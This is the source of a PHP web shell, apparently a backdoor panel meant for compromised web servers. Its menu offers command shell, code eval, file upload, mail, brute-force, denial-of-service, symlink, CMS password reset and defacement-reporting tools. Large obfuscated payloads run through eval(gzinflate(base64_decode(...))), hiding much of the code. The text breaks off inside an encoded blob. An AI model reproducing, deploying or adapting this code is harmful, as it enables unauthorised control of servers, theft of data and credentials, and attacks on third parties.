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'))); ?>
							</tr>
						</table>
					</td> 
					<td>
						<?php echo $buff; ?>
					</td> 
				</tr>
			</table>	
		</div> 
		<!-- head info end here --> 
   		<!-- menu start --> 
      		<div id="menu"> 
            <center>
			<a href="?<?php echo "y=".$pwd; ?>">			<b>Explore</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">	<b>Shell</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">		<b>Eval</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">	<b>MySQL</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">	<b>PHP</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">	<b>NetSploit</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">	<b>Upload</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">		<b>Mail</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">	<b>BruteForce</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=readable">	<b>OpenDIR</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">		<b>D0S</b></a><br><br>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=localdomain">	<b>LocalDomain</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone-h">        <b>Zone-H</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">        <b>Symlink</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=identify">        <b>Domain Script</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">        <b>SQLI Scan</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=web-info">        <b>Website Whois</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=port-scanner">        <b>Port-Scanner</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">        <b>WP Reset</b></a><br><br> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">        <b>Jomlaa Reset</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=cms-scanner">        <b>CMS Scanner</b></a> 
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">        <b>VB Changer</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=string-encode">        <b>String Encoder</b></a>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysqlbackup">	<b>SQL Backup</b></a>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">        <b>WHMCS Decoder</b></a>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=security-mode">        <b>Security Mode</b></a>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=process">        <b>Process</b></a> 
            </center>
		</div>
     		<!-- menu end -->
            
            
		<?php 
		if(isset($_GET['x']) && ($_GET['x'] == 'php'))
			{ 
			?> 
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"> 
<table class="cmdbox"> 

<tr>
<td>
<textarea class="output" name="cmd" id="cmd"><? eval(gzinflate(base64_decode('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
